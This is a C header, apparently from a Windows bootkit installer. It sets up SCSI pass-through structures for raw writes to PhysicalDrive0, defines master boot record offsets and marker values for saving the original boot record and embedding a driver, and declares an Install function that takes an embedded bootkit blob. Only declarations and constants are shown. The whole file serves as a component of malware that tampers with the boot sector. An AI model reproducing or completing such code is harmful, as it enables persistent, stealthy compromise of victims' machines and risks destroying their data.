#include <phnt_windows.h>
#include <phnt.h>
#include "ntddscsi.h"
#define _NTSCSI_USER_MODE_
#include "scsi.h"
#include <stddef.h>
#include <stdint.h>

#include <stdio.h>
#define LOG printf

/*****************************************************************************/
// from spti.h in the DDK
#define SPT_SENSE_LENGTH 32
typedef struct _SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER {
	SCSI_PASS_THROUGH_DIRECT sptd;
	ULONG             Filler;      // realign buffer to double word boundary
	UCHAR             ucSenseBuf[SPT_SENSE_LENGTH];
} SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER;
/*****************************************************************************/

#define SECTOR_LENGTH 512
#define CALC_SECTOR_COUNT(len) ((len + SECTOR_LENGTH - 1) / SECTOR_LENGTH)
#define MAX_PARTITION_COUNT 4
#define MBR_DISK_SIGNATURE_OFFSET 0x1b8
#define MBR_MAGIC 0xAA55
#define ORIG_MBR_MAGIC 0xAAAA
#define DRV_SIZE_MAGIC 0xBBBB
#define DRV_SECT_MAGIC 0xCCCC

#define STR_PHYSDRIVE0 L"\\??\\PhysicalDrive0"

#define STATUS_INIT NTSTATUS status = STATUS_NOT_IMPLEMENTED

enum ScsiOperation
{
	None,
	ScsiRead,
	ScsiWrite
};

extern const UINT8 BootkitStart[];
extern const UINT8 BootkitEnd[];
NTSTATUS Install(const UINT8 Bootkit[], UINT16 Size);